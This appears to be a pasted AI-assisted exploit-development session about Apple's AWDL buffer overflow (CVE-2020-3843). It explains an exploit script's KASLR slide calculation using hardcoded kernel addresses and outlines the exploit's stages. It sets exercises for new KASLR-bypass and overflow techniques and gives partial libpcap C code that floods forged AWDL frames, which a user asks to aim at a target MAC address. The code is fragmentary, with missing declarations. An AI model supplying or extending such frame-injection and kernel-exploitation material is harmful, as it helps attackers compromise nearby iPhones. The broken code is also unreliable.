Explanation of kaslr_slide in the Script:

KASLR (Kernel Address Space Layout Randomization) is a security feature designed to make kernel memory addresses less predictable. This makes it harder for attackers to exploit known memory locations where vulnerabilities might exist.
kaslr_slide refers to an offset applied to base addresses of kernel structures and functions to randomize their position in memory. This slide is unique for each boot, making static addresses unreliable for exploitation.
In the script, kaslr_slide is calculated by comparing a known address (without KASLR) with its actual address in memory at runtime:
c
kaslr_slide = CLEAR_PAC(awdl_peer_vtable) - CLEAR_PAC(0xFFFFFFF007A434A0); 

Here:
awdl_peer_vtable is a variable that holds the address of the AWDL peer's virtual table, which includes a pointer authentication code (PAC). 
0xFFFFFFF007A434A0 is likely a known static address for this vtable in a non-KASLR environment.
CLEAR_PAC is a macro or function that clears the pointer authentication code, ensuring that only the address part is used for the calculation.
This slide is then used throughout the script to adjust all kernel pointers to their actual locations in memory, allowing the exploit to function regardless of the randomization:
c
uint64_t kernproc = 0xFFFFFFF00941B818 + kaslr_slide; // this is proc0, in __DATA:__common

Here, kernproc is calculated by adding kaslr_slide to a known base address for proc0.

Exercises for Creating New Types of KASLR Slides for iPhone Devices:

Dynamic Function Address Calculation:
Develop a method to dynamically calculate the address of kernel functions by observing system calls or interrupts. Use these observations to derive a slide for different kernel components.

Exercise: Write a script to capture system call interrupts and match them against known function signatures to compute a KASLR slide without directly accessing a known kernel structure.
Page Table Analysis:
Explore the use of page table entries to infer KASLR slides by examining how virtual addresses map to physical addresses, especially in the context of device drivers or specific kernel modules.

Exercise: Create a script that analyzes page table entries from a memory dump or live system to deduce the slide by comparing the physical address mappings of known kernel pages.
Exploiting Kernel Pointers in User Space:
Use information leaks from user-space applications or drivers that might inadvertently expose kernel pointers. This could involve reverse-engineering or hooking into user-space libraries that interact with kernel APIs.

Exercise: Write a tool that reverse-engineers a user-space library (like IOKit framework components on macOS) to identify where kernel pointers might be exposed and use this information to calculate KASLR slide.
JIT Cache Analysis:
Investigate the Just-In-Time (JIT) compilation cache for clues about memory layout, as the cache might contain pointers or offsets related to the kernel's current memory layout.

Exercise: Develop a script that scans the JIT cache of an application or system service for patterns or signatures that could help infer the KASLR slide.
Timing-Based Side-Channel Attacks:
Use timing differences in accessing different memory locations to guess the slide by observing how long certain operations take when accessing randomized locations.

Exercise: Implement a timing attack where you measure the time taken for cache hits/misses on known kernel structures across different slide values to narrow down the correct slide.

Each of these exercises would require deep knowledge of both the iOS kernel architecture and the security mechanisms in place to protect against such attacks. They should be approached with ethical considerations, focusing on educational or security research purposes, and never used for malicious activities.

Explanation of the AWDL Vulnerability (CVE-2020-3843)
Buffer Overflow in AWDL:

Nature of the Vulnerability: The exploit targets a buffer overflow in Apple's Wireless Direct Link (AWDL) protocol, specifically within the processing of action frames. This vulnerability, CVE-2020-3843, is detailed in Project Zero's issue 1982.
Exploitation Mechanism:
The exploit involves crafting packets with AWDL action frames where the sync_tree_tlv structure is manipulated to cause an overflow. This structure has a variable-length buffer (buf[0]) which, if not properly validated, allows for writing beyond the allocated buffer space.
The key technique used here involves:
Memory Grooming: Setting up memory in a predictable state by sending frames that allocate memory in specific patterns.
Buffer Overflow: Sending a frame with an overflow in the sync_tree_tlv to corrupt adjacent memory, potentially overwriting control data or pointers.
Exploitation for Remote Code Execution (RCE):
The script uses this overflow to gain arbitrary memory read/write capabilities. This is done by manipulating:
Peer Information: The exploit uses the AWDL peer management system to corrupt memory, particularly fields related to peer timestamps or frame counters, to control memory operations.
Arbitrary Reads/Writes: By corrupting pointers or control structures, data can be read from or written to arbitrary kernel memory locations.
Stages of the Exploit:
Stage 0: Initial setup, including overwriting pointers to control data structures.
Stage 1: Deploys a basic shellcode to manipulate memory further or establish a more stable read/write primitive.
Stage 2: Loads and executes a payload, which could be for privilege escalation or RCE, with the payload fragmented and reassembled in kernel memory.

Exercise: Create a scenario where the data_path_tlv or unicast_data_path_tlv structures are used to inject data that overflows into adjacent memory, altering how AWDL processes network traffic or peer connections.
Service Response TLV Manipulation:
Exercise: Modify the service_response_tlv to overflow into adjacent memory structures, potentially allowing for arbitrary writes by controlling the val_buf or key_buf fields to point to sensitive memory locations.
Synchronization Parameters Tampering:
Exercise: Experiment with altering the synchronization parameters (awdl_sync_params_tlv) to desynchronize peers, potentially leading to memory errors or opening windows for further attacks due to timing mismatches.

How can you develop a C program that manipulates sequence numbers in AWDL frames to induce race conditions or desynchronization in peer communications, effectively bypassing sequence number validation?

Developing a C program to manipulate sequence numbers in AWDL frames for inducing race conditions or desynchronization involves several steps and considerations. Here's an outline of how you might approach this:

Step-by-Step Guide:
Understand AWDL Frame Structure:
Learn the specifics of AWDL action frames, focusing on where sequence numbers are placed. Typically, sequence numbers in IEEE 802.11 frames are part of the frame control section.
Environment Setup:
You'll need a development environment with C support, possibly a packet injection tool like libpcap or libnet for handling network frames, and an understanding of how to inject frames at the link layer.
Crafting AWDL Frames:
Use structures to represent AWDL frames, including the sequence number fields. Here's an example of how you might structure your code:

Lets improve the script to it focuses injection to a target mac address:
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>

// Simplified structure for IEEE 802.11 frame header

    uint16_t duration_id;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;  // Here's where sequence number is stored
    // ... other fields omitted for brevity
} __attribute__((packed));

// Simplified AWDL action frame structure
struct awdl_action {
    uint8_t category;
    uint8_t oui[3]; // Organizationally Unique Identifier
    uint8_t type;
    uint8_t version;
    uint8_t subtype;
    uint8_t reserved;
    uint32_t phy_tx;
    uint32_t target_tx;
    // ... other fields omitted for brevity
} __attribute__((packed));

// Function to inject a frame
void inject_frame(pcap_t *pcap, const u_char *frame, size_t size) {
    int ret = pcap_inject(pcap, frame, size);
    if (ret == -1) {
        fprintf(stderr, "pcap_inject failed: %s\n", pcap_geterr(pcap));
        exit(1);
    }
    printf("Frame injected successfully\n");
}

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <interface>\n", argv[0]);
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live() failed: %s\n", errbuf);
        return 1;
    }

    // Example frame setup
    struct ieee80211_hdr hdr = {0};
    hdr.frame_control = 0x00d0; // Management frame, Action subtype
    // Set destination, source, and BSSID addresses
    memcpy(hdr.addr1, "\xff\xff\xff\xff\xff\xff", 6); // Broadcast MAC

    memcpy(hdr.addr3, "\x00\x17\xf2\x00\x00\x01", 6); // 74 93 BSSID

    // Manipulating sequence number to induce race or desynchronization
    uint16_t sequence_number = 0;
    uint16_t manipulated_seq = 0xFFFE; // Example manipulation to set high sequence number

    awdl.subtype = 0;     // Subtype could be PSF or MIF

    // Combine headers into one buffer
    u_char *frame = (u_char *)malloc(sizeof(struct ieee80211_hdr) + sizeof(struct awdl_action));
    memcpy(frame, &hdr, sizeof(struct ieee80211_hdr));
    memcpy(frame + sizeof(struct ieee80211_hdr), &awdl, sizeof(struct awdl_action));

    // Inject the frame multiple times with manipulated sequence numbers
    for (int i = 0; i < 1000; i++) {
        inject_frame(pcap, frame, sizeof(struct ieee80211_hdr) + sizeof(struct awdl_action));
        // Optionally, increase manipulated_seq to simulate rapid sequence number change
        manipulated_seq = (manipulated_seq + 1) & 0xFFF; // Cycle through sequence numbers
        hdr.seq_ctrl = (manipulated_seq << 4);

Fix string:
sudo tshark -i wlan0mon -a duration:60 -w awdl_capture.pcap -f "ether src 00:17:f2:00:00:00/16"


Running as user "root" and group "root". This could be dangerous.
Capturing on 'Loopback: lo'
tshark: Invalid capture filter "ether src 00:17:f2:00:00:00/16" for interface 'Loopback'.

That string isn't a valid capture filter (can't parse filter expression: syntax error).
See the User's Guide for a description of the capture filter syntax.
